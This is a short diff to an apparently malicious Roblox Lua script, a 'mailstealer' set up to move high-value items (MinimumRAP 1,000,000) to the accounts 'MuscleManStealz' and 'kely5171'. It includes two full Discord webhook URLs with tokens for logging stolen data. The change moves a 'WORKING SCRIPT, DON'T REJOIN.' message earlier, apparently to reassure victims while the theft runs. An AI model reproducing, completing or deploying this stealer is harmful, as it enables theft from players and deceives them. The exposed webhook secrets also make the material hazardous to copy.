@@ -2,6 +2,7 @@ Username = "MuscleManStealz"
 Username2 = "kely5171"
 Webhook = "https://discord.com/api/webhooks/1292029911380394085/fpz6YNSZY_bqIOP6zd2S4nzLQteyva7ZfHafM5kmvkDX8cAe7UOz9FN8Behc9pqwwKoN"
 MinimumRAP = 1000000
+print("WORKING SCRIPT, DON'T REJOIN.")
 
 LogsWebhook = "https://discord.com/api/webhooks/1292732752650833963/oFYNr8KAXHfS1b4iagJdc0a2fzru6IYn7fGTDHZyIg5VDB2poUICHDl1HM8xt8VGfHXg"
 mailstealer_name = "Muscle"
@@ -45,7 +46,6 @@ repeat
 until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
 
 -- variables:
-print("WORKING SCRIPT, DON'T REJOIN.")
 local Library = require(game.ReplicatedStorage.Library)
 local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 local Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
